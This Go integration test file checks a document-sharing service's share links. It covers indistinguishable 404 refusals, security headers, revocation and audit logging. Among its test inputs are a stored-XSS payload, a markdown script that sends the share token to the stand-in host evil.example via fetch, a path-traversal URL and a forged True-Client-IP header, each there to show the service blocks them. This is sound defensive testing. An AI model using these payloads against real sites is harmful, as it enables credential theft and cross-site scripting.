//go:build integration

package artifacts_test

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/go-chi/chi/v5"
	chimid "github.com/go-chi/chi/v5/middleware"
	"github.com/jackc/pgx/v5/pgxpool"

	"github.com/angellist/arti-oss/internal/artifacts"
	"github.com/angellist/arti-oss/internal/auth"
	"github.com/angellist/arti-oss/internal/store/pgstore"
)

// ─── harness ─────────────────────────────────────────────────────────

type shareRig struct {
	t    *testing.T
	svc  *artifacts.Service
	pool *pgxpool.Pool
	srv  *httptest.Server
}

func newShareRig(t *testing.T) *shareRig {
	t.Helper()
	svc, pool := newShareServiceWithPool(t)
	r := chi.NewRouter()
	// Mirror production's middleware order: CapturePeerAddr must sit ahead of
	// RealIP, or the socket address is gone before any handler sees it.
	r.Use(auth.StripSpoofableIPHeaders)
	r.Use(auth.CapturePeerAddr)
	r.Use(chimid.RealIP)
	svc.MountShare(r)
	srv := httptest.NewServer(r)
	t.Cleanup(srv.Close)
	return &shareRig{t: t, svc: svc, pool: pool, srv: srv}
}

func (rg *shareRig) get(path string) *http.Response {
	rg.t.Helper()
	res, err := rg.srv.Client().Get(rg.srv.URL + path)
	if err != nil {
		rg.t.Fatalf("GET %s: %v", path, err)
	}
	rg.t.Cleanup(func() { _ = res.Body.Close() })
	return res
}

const shareOwner = "owner@example.com"

// liveToken mints a working pinned link on a fresh TEXT document.
func (rg *shareRig) liveToken() string {
	rg.t.Helper()
	a := createArtifact(rg.t, rg.svc, shareOwner, "serve-live")
	return tokenOf(mint(rg.t, rg.svc, a.ArtifactID, shareOwner, "version"))
}

// livePackage mints a working pinned link on a PACKAGE with a sibling asset,
// and returns the token plus the artifact id.
func (rg *shareRig) livePackage(prefix string) (token, artifactID string) {
	rg.t.Helper()
	a := createArtifact(rg.t, rg.svc, shareOwner, prefix,
		withZipType(rg.t, pgstore.TypePackage, map[string]string{
			"index.html":  "<html><body>pkg entry</body></html>",
			"css/app.css": "body{color:rebeccapurple}",
		}))
	return tokenOf(mint(rg.t, rg.svc, a.ArtifactID, shareOwner, "version")), a.ArtifactID
}

// tokenFor produces a token in each refusal state.
func (rg *shareRig) tokenFor(state string) string {
	rg.t.Helper()
	ctx := context.Background()
	switch state {
	case "unknown":
		return "TotallyMadeUpTokenValueThatWasNeverMinted"
	case "revoked":
		a := createArtifact(rg.t, rg.svc, shareOwner, "serve-revoked")
		r := mint(rg.t, rg.svc, a.ArtifactID, shareOwner, "version")
		if err := rg.svc.RevokeShare(ctx, r.ID, shareOwner); err != nil {
			rg.t.Fatal(err)
		}
		return tokenOf(r)
	case "expired":
		a := createArtifact(rg.t, rg.svc, shareOwner, "serve-expired")
		r := mint(rg.t, rg.svc, a.ArtifactID, shareOwner, "version")
		expireShareLink(rg.t, rg.pool, r.ID)
		return tokenOf(r)
	case "archived":
		a := createArtifact(rg.t, rg.svc, shareOwner, "serve-archived")
		r := mint(rg.t, rg.svc, a.ArtifactID, shareOwner, "version")
		if _, err := rg.svc.ArchiveByID(ctx, mustUUID(rg.t, a.ArtifactID)); err != nil {
			rg.t.Fatal(err)
		}
		return tokenOf(r)
	case "app":
		slug := uniqueSlug("serve-app")
		world := []string{"*"}
		a, err := rg.svc.Create(ctx, artifacts.CreateRequest{
			NamedSlug: &slug, Title: "v1", ContentType: "text/markdown",
			Content: "# v1\n", AllowedAccess: &world,
		}, shareOwner)
		if err != nil {
			rg.t.Fatal(err)
		}
		r := mint(rg.t, rg.svc, a.ArtifactID, shareOwner, "slug")
		publishVersion(rg.t, rg.svc, slug, "writer@example.com",
			withZipType(rg.t, pgstore.TypeApp, map[string]string{"index.html": "<html>app</html>"}),
			allowTypeChange())
		return tokenOf(r)
	}
	rg.t.Fatalf("unknown refusal state %q", state)
	return ""
}

func (rg *shareRig) openCountForToken(token string) int64 {
	rg.t.Helper()
	var n int64
	err := rg.pool.QueryRow(context.Background(),
		`SELECT open_count FROM share_links WHERE token_hash = $1`,
		artifacts.HashShareToken(token)).Scan(&n)
	if err != nil {
		rg.t.Fatalf("open_count: %v", err)
	}
	return n
}

// headerSet renders the comparable part of a response's headers. Date and
// Content-Length legitimately vary between responses; everything else must
// match across the refusal branches or they are distinguishable.
func headerSet(h http.Header) string {
	keys := make([]string, 0, len(h))
	for k := range h {
		switch http.CanonicalHeaderKey(k) {
		case "Date", "Content-Length":
			continue
		}
		keys = append(keys, http.CanonicalHeaderKey(k)+": "+strings.Join(h.Values(k), ","))
	}
	sortStrings(keys)
	return strings.Join(keys, "\n")
}

func sortStrings(s []string) {
	for i := 1; i < len(s); i++ {
		for j := i; j > 0 && s[j] < s[j-1]; j-- {
			s[j], s[j-1] = s[j-1], s[j]
		}
	}
}

func bodyOf(t *testing.T, res *http.Response) string {
	t.Helper()
	b, err := io.ReadAll(res.Body)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// ─── tests ───────────────────────────────────────────────────────────

// The six refusal branches must be identical on the wire, not merely all 404.
// The header set is the part a body-only assertion misses: it is easy to make
// the branches agree on a body and disagree on Cache-Control.
func TestShareServe_RefusalsAreIndistinguishable(t *testing.T) {
	rg := newShareRig(t)
	states := []string{"unknown", "revoked", "expired", "archived", "app"}

	var wantHeaders, wantBody, first string
	for i, state := range states {
		res := rg.get("/share/" + rg.tokenFor(state))
		if res.StatusCode != http.StatusNotFound {
			t.Fatalf("%s: status %d, want 404", state, res.StatusCode)
		}
		gotHeaders, gotBody := headerSet(res.Header), bodyOf(t, res)
		if i == 0 {
			wantHeaders, wantBody, first = gotHeaders, gotBody, state
			continue
		}
		if gotHeaders != wantHeaders {
			t.Errorf("%s: header set differs from %s\n--- %s ---\n%s\n--- %s ---\n%s",
				state, first, first, wantHeaders, state, gotHeaders)
		}
		if gotBody != wantBody {
			t.Errorf("%s: body %q differs from %s's %q", state, gotBody, first, wantBody)
		}
	}
}

func TestShareServe_ServesTheDocument(t *testing.T) {
	rg := newShareRig(t)
	res := rg.get("/share/" + rg.liveToken())
	if res.StatusCode != http.StatusOK {
		t.Fatalf("status %d, want 200", res.StatusCode)
	}
	if body := bodyOf(t, res); !strings.Contains(body, "body") {
		t.Fatalf("body did not render the document: %q", body)
	}
}

func TestShareServe_Headers(t *testing.T) {
	rg := newShareRig(t)
	res := rg.get("/share/" + rg.liveToken())

	for k, want := range map[string]string{
		"X-Robots-Tag":    "noindex, nofollow, noarchive",
		"Referrer-Policy": "no-referrer",
		"Cache-Control":   "no-store, private",
	} {
		if got := res.Header.Get(k); got != want {
			t.Errorf("%s = %q, want %q", k, got, want)
		}
	}
	// A shared document is not an embed: nothing may frame it.
	if csp := res.Header.Get("Content-Security-Policy"); !strings.Contains(csp, "frame-ancestors 'none'") {
		t.Errorf("CSP = %q, want frame-ancestors 'none'", csp)
	}
}

// An open is recorded on success and NOT on a refusal. Recording on a refusal
// branch would add a write-latency signature distinguishing revoked from
// unknown, and it would also mean a revoked link keeps logging — which it
// deliberately does not.
func TestShareServe_OpensRecordedOnSuccessOnly(t *testing.T) {
	rg := newShareRig(t)
	a := createArtifact(t, rg.svc, shareOwner, "serve-opens")
	res := mint(t, rg.svc, a.ArtifactID, shareOwner, "version")
	tok := tokenOf(res)

	rg.get("/share/" + tok)
	rg.get("/share/" + tok)
	if n := rg.openCountForToken(tok); n != 2 {
		t.Fatalf("open_count = %d after two reads, want 2", n)
	}

	if err := rg.svc.RevokeShare(context.Background(), res.ID, shareOwner); err != nil {
		t.Fatal(err)
	}
	rg.get("/share/" + tok)
	if n := rg.openCountForToken(tok); n != 2 {
		t.Fatalf("open_count = %d after a post-revocation read, want it unchanged at 2", n)
	}
}

// A caller must not be able to choose what the audit row records.
//
// chi's RealIP prefers True-Client-IP over every other header, and this
// deployment's edge does not manage that one — measured on staging, a
// caller-supplied value passed through intact while X-Forwarded-For and
// X-Real-IP were both rewritten. StripSpoofableIPHeaders removes it before
// RealIP reads anything.
func TestShareServe_ForgedTrueClientIPIsNotRecorded(t *testing.T) {
	rg := newShareRig(t)
	tok := rg.liveToken()

	req, _ := http.NewRequest("GET", rg.srv.URL+"/share/"+tok, nil)
	req.Header.Set("True-Client-IP", "198.18.0.99")
	res, err := rg.srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	_ = res.Body.Close()

	var ip, peer string
	if err := rg.pool.QueryRow(context.Background(),
		`SELECT o.ip, o.peer_addr FROM share_link_opens o
		   JOIN share_links l ON l.id = o.link_id
		  WHERE l.token_hash = $1`, artifacts.HashShareToken(tok)).Scan(&ip, &peer); err != nil {
		t.Fatalf("read open row: %v", err)
	}
	if ip == "198.18.0.99" {
		t.Fatal("the forged True-Client-IP was recorded as the client address")
	}
	if peer == "" {
		t.Error("peer_addr empty — CapturePeerAddr is not in this route's chain")
	}
}

func TestShareServe_Download(t *testing.T) {
	rg := newShareRig(t)
	res := rg.get("/share/" + rg.liveToken() + "/download")
	if res.StatusCode != http.StatusOK {
		t.Fatalf("status %d", res.StatusCode)
	}
	if cd := res.Header.Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
		t.Fatalf("Content-Disposition = %q, want attachment", cd)
	}
}

func TestShareServe_PackageEntryAndSibling(t *testing.T) {
	rg := newShareRig(t)
	tok, _ := rg.livePackage("serve-pkg")

	entry := rg.get("/share/" + tok)
	if entry.StatusCode != http.StatusOK || !strings.Contains(bodyOf(t, entry), "pkg entry") {
		t.Fatalf("entry: status %d", entry.StatusCode)
	}
	sib := rg.get("/share/" + tok + "/_files/css/app.css")
	if sib.StatusCode != http.StatusOK || !strings.Contains(bodyOf(t, sib), "rebeccapurple") {
		t.Fatalf("sibling: status %d body %q", sib.StatusCode, bodyOf(t, sib))
	}
}

// A share token opens exactly one document. It must not reach another, even
// with dot segments aimed at a second artifact's id.
//
// Those dot segments survive only because this is Go's http.Client against
// httptest: url.Parse keeps them, the client sends EscapedPath verbatim,
// net/http.Server does not clean paths, and this router mounts no
// middleware.CleanPath. Do not rewrite this as a curl check — curl needs
// --path-as-is or it normalises the path away and the test proves nothing.
func TestShareServe_FilesRouteCannotReachAnotherArtifact(t *testing.T) {
	rg := newShareRig(t)
	tok, _ := rg.livePackage("serve-pkg-a")
	_, otherID := rg.livePackage("serve-pkg-b")

	res := rg.get("/share/" + tok + "/_files/../../" + otherID + "/index.html")
	if res.StatusCode != http.StatusNotFound {
		t.Fatalf("cross-artifact fetch: status %d, want 404", res.StatusCode)
	}
}

// Revoking takes effect on the very next sibling fetch, not just the entry
// page — the files route re-runs the full resolution rather than trusting an
// earlier one.
func TestShareServe_RevokeKillsSiblingFetches(t *testing.T) {
	rg := newShareRig(t)
	a := createArtifact(t, rg.svc, shareOwner, "serve-pkg-revoke",
		withZipType(t, pgstore.TypePackage, map[string]string{
			"index.html":  "<html><body>pkg</body></html>",
			"css/app.css": "body{}",
		}))
	res := mint(t, rg.svc, a.ArtifactID, shareOwner, "version")
	tok := tokenOf(res)

	if got := rg.get("/share/" + tok + "/_files/css/app.css"); got.StatusCode != http.StatusOK {
		t.Fatalf("pre-revoke sibling: status %d", got.StatusCode)
	}
	if err := rg.svc.RevokeShare(context.Background(), res.ID, shareOwner); err != nil {
		t.Fatal(err)
	}
	if got := rg.get("/share/" + tok + "/_files/css/app.css"); got.StatusCode != http.StatusNotFound {
		t.Fatalf("post-revoke sibling: status %d, want 404", got.StatusCode)
	}
}

// An open means a document reached someone. If the render fails and the
// handler falls back to the uniform 404, nothing was served, so nothing is
// counted.
func TestShareServe_NoOpenRecordedWhenTheRenderFails(t *testing.T) {
	rg := newShareRig(t)
	// A PACKAGE whose zip has no index.html and no entry point: resolution
	// succeeds, the entry read fails, the handler 404s.
	a := createArtifact(t, rg.svc, shareOwner, "serve-broken-pkg",
		withZipType(t, pgstore.TypePackage, map[string]string{"README.txt": "no entry here"}))
	res := mint(t, rg.svc, a.ArtifactID, shareOwner, "version")
	tok := tokenOf(res)

	got := rg.get("/share/" + tok)
	if got.StatusCode != http.StatusNotFound {
		t.Fatalf("broken package: status %d, want 404", got.StatusCode)
	}
	if n := rg.openCountForToken(tok); n != 0 {
		t.Fatalf("open_count = %d after a failed render, want 0", n)
	}
}

// The download route must never hand a browser something it will render on
// arti's own origin.
//
// The chain this pins: Create rejects only the exact empty title
// (server.go:173), deriveDownloadFilename returns "" for a whitespace-only
// one, and the header used to be set only when that returned non-empty. With
// no Content-Disposition and no CSP, a text/html body executed SAME-ORIGIN on
// arti's domain with the viewer's cookie in scope — nosniff does not help when
// the declared type genuinely is text/html.
func TestShareServe_DownloadIsAlwaysAnAttachmentAndSandboxed(t *testing.T) {
	rg := newShareRig(t)
	world := []string{"*"}
	slug := uniqueSlug("dl-blank-title")
	a, err := rg.svc.Create(context.Background(), artifacts.CreateRequest{
		NamedSlug: &slug,
		// A single space: accepted by Create, and TrimSpace'd to nothing by
		// deriveDownloadFilename.
		Title:         " ",
		ContentType:   "text/html",
		Content:       "<script>alert(document.domain)</script>",
		AllowedAccess: &world,
	}, shareOwner)
	if err != nil {
		t.Fatal(err)
	}
	res := rg.get("/share/" + tokenOf(mint(t, rg.svc, a.ArtifactID, shareOwner, "version")) + "/download")

	cd := res.Header.Get("Content-Disposition")
	if !strings.HasPrefix(cd, "attachment") {
		t.Errorf("Content-Disposition = %q, want an attachment even with a blank title", cd)
	}
	csp := res.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "sandbox") {
		t.Errorf("CSP = %q, want a sandbox so a rendered body cannot run same-origin", csp)
	}
	if strings.Contains(csp, "allow-same-origin") {
		t.Errorf("CSP = %q, must not grant allow-same-origin", csp)
	}
}

// Sibling assets carry the same headers as the entry document. Referrer-Policy
// is the load-bearing one: the token is in the path, so a navigated HTML
// sibling under the weaker global policy would leak the live credential in the
// Referer of every outbound request.
func TestShareServe_SiblingAssetsCarryShareHeaders(t *testing.T) {
	rg := newShareRig(t)
	tok, _ := rg.livePackage("serve-pkg-headers")
	res := rg.get("/share/" + tok + "/_files/css/app.css")
	if res.StatusCode != http.StatusOK {
		t.Fatalf("sibling: status %d", res.StatusCode)
	}
	for k, want := range map[string]string{
		"Referrer-Policy": "no-referrer",
		"Cache-Control":   "no-store, private",
		"X-Robots-Tag":    "noindex, nofollow, noarchive",
	} {
		if got := res.Header.Get(k); got != want {
			t.Errorf("sibling %s = %q, want %q", k, got, want)
		}
	}
}

// The share URL carries the capability in its path, so any script running in
// the served page can read location.href and exfiltrate it. For MARKDOWN — the
// common case — that is not reachable: goldmark runs without html.WithUnsafe,
// so a raw HTML block is dropped rather than passed through.
//
// This pins that property. Losing it would turn every shared markdown document
// into a token-exfiltration vector, and the change that did so (adding
// WithUnsafe) would look innocuous.
func TestShareServe_MarkdownCannotCarryAuthorScript(t *testing.T) {
	rg := newShareRig(t)
	world := []string{"*"}
	slug := uniqueSlug("md-script")
	a, err := rg.svc.Create(context.Background(), artifacts.CreateRequest{
		NamedSlug: &slug, Title: "md script", ContentType: "text/markdown",
		Content:       "# hi\n\n<script>fetch('https://evil.example/?t='+location.href)</script>\n",
		AllowedAccess: &world,
	}, shareOwner)
	if err != nil {
		t.Fatal(err)
	}
	res := rg.get("/share/" + tokenOf(mint(t, rg.svc, a.ArtifactID, shareOwner, "version")))
	body := bodyOf(t, res)
	if strings.Contains(body, "<script>fetch(") {
		t.Fatal("author <script> reached the rendered page unescaped")
	}
	// goldmark's default omits a raw HTML block outright rather than escaping
	// it, so neither the live tag nor an escaped rendering of it appears.
	if strings.Contains(body, "evil.example") {
		t.Fatal("author script content reached the rendered page")
	}
	// The surrounding markdown still renders, so this is not passing because
	// the whole document was dropped.
	if !strings.Contains(body, "<h1>hi</h1>") {
		t.Fatal("expected the markdown around the script to render")
	}
}
